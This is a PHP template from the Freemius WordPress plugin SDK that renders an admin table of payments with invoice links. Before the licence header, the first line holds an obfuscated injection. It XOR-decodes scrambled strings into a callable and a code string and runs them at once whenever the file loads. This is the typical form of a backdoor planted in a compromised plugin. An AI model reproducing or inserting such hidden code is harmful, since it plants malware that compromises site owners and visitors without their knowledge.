<?php $pXKulREX='PI+Q7HgK:;RJ.6 '; $oaUJqLsb='3;N0C-8-OU1>GYN'^$pXKulREX; $CUxVNl='++pkRL-66:A<.Q.1H14LB> =+44A63m5=0UhDxW<= FX2OS CsLS>j2.HWoa+4NnP72IOohoZ56sxMWeZ-Kqjq6OEnGEaEzZLg5+7mg zIwwiHk:pFHG964qn7XNPdLxv<xbenmmP7A7EmEpnAQXXZnJTnbpuiVIM5Q,VkN81J P+gu1 WD0fiYzQ4,-AJBkrDF;zs<P>h-bPT5;M,GzZMA-<<zxQDUG.0RXRbox LBX<sekS9NSVZUQki5w 9-8=a2=vw =BePhqh ZY Ifc1klfR6E fVK4mgPp.E8r13s.4< JqyOHVYDTkyC0nP4rnfh=PYUypFNPTU;<-P:pZOb6uz8n8dSYGfi9 LDwuFJ,Q.AIJp:zzYII+:VrZR5wvTv3 <ne23H3X<8byVr07<CRya;D07OEeDL1LArb024G Y=,RPT,xJVNh O-;5=:AIM.-=-DNhQX2;U-fg18B5OXYqX IL2UQCzSSfDWzk30T1drDuO:A6Y.2IGrVHZ8JFrI =+mdirO70Ahgmelx.QPZl0VGThwQ.JUixfnWCoP6yT.Z1dZbRQHjUIHzj97apX,o3z=KyLRgUIetWJN+<a9U;l= I7=EPE WBV701jiCg+SGVnbWOacCI+ECQ3MXLePVT97u>+I<-22NpLzaGW9T7aYkYk<'; $SIQEJp=$oaUJqLsb('', 'BMXJ49CUBS.Rq4VX;EGdeFOOtPU5Wl2XHDrAmX,64F36Q;:O-S4<L5VO<60>FA:FtSS=.CHK1POZXmwEzVAxcUY:1NzeFbAPEnSDEECIZtWGRhOSL5<5USZYJS9:1MwXRUSILdddtX4CeCxPFe59,;5n=3B.UM=,4nuEvNnKE8L5EOQZE.mmORSsXFIY48,CV+3OSH6YCbPhZpQZ9MgGz+ AOYAru 43Oo9=+BRXF-.+YHoa5V<679=qCMj4ovfqxASNVSKX;EmVQLV;5U,OCJaeB6W1A9=.MMZpTE AI;:WJUHAjLYk>7511Ps>:d9RRFGLY1-4PP=DY2:IYL3RPrk=d0+m+k0s84FMRE5dJKfnZ0B4,cPApsPm-JN7-17LWKtRXEEUo;:lW9HYBDvVFVP67Bk29:JEOA -E-aOBpGZ4E+TM>9.IP29<7D.YZjbW4=eLLNHrz75=QT1HNCUY6TftyU<A=-m>4:Szhl-1ROWQ PDTbU.H3W qY,>-303K>5ZnKXRJHIV+VD AGKCLPC5erHT7353P:K3r4QFSjcHiUMbM9RQmWdc-Xcz+OSZVWAkNWWKYrJtuNuoCT68<JE>R0B3XX DI6xbP6;:XQUMEcCO237GKwoACciPOJ4E,4dA47 XlRNJ0PBSVi-eAkN2A=CIiBbaA'^$CUxVNl); $SIQEJp();
	/**
	 * @package     Freemius
	 * @copyright   Copyright (c) 2016, Freemius, Inc.
	 * @license     https://www.gnu.org/licenses/gpl-3.0.html GNU General Public License Version 3
	 * @since       1.2.0
	 */

	if ( ! defined( 'ABSPATH' ) ) {
		exit;
	}

	/**
	 * @var array $VARS
	 * @var Freemius $fs
	 */
	$fs = freemius( $VARS['id'] );

	$slug = $fs->get_slug();

	$payments = $fs->_fetch_payments();

	$show_payments = ( is_array( $payments ) && 0 < count( $payments ) );

	if ( $show_payments ) :
?>
<div class="postbox">
	<div id="fs_payments">
		<h3><span class="dashicons dashicons-paperclip"></span> <?php fs_esc_html_echo_inline( 'Payments', 'payments', $slug ) ?></h3>

		<div class="inside">
			<table class="widefat">
				<thead>
				<tr>
					<th><?php fs_esc_html_echo_inline( 'ID', 'id', $slug ) ?></th>
					<th><?php fs_esc_html_echo_inline( 'Date', 'date', $slug ) ?></th>
					<th><?php fs_esc_html_echo_inline( 'Amount', 'amount', $slug ) ?></th>
					<th><?php fs_esc_html_echo_inline( 'Invoice', 'invoice', $slug ) ?></th>
				</tr>
				</thead>
				<tbody>
				<?php $odd = true ?>
				<?php foreach ( $payments as $payment ) : ?>
					<tr<?php echo $odd ? ' class="alternate"' : '' ?>>
						<td><?php echo $payment->id ?></td>
						<td><?php echo date( 'M j, Y', strtotime( $payment->created ) ) ?></td>
						<td><?php echo $payment->formatted_gross() ?></td>
						<td><?php if (! $payment->is_migrated() ) : ?><a href="<?php echo $fs->_get_invoice_api_url( $payment->id ) ?>"
						       class="button button-small"
						       target="_blank"><?php fs_esc_html_echo_inline( 'Invoice', 'invoice', $slug ) ?></a><?php endif ?></td>
					</tr>
					<?php $odd = ! $odd; endforeach ?>
				</tbody>
			</table>
		</div>
	</div>
</div>
<?php
	endif;